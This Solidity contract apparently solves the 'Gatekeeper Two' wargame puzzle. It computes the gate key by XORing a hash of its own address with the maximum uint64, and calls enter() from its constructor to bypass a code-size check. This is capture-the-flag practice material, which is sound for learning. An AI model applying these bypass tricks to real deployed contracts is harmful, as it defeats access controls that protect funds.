pragma solidity 0.8.17;
import "../utils/BytesLib.sol";
import "../../lib/forge-std/src/console.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateTwoCracker {
    constructor(address _gateTwoAddress) {
        uint64 gateKey64 = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ type(uint64).max;

        bytes8 gateKey = bytes8(gateKey64);
        IGatekeeperTwo gatekeeperTwo = IGatekeeperTwo(_gateTwoAddress);
        gatekeeperTwo.enter(gateKey);
    }
}
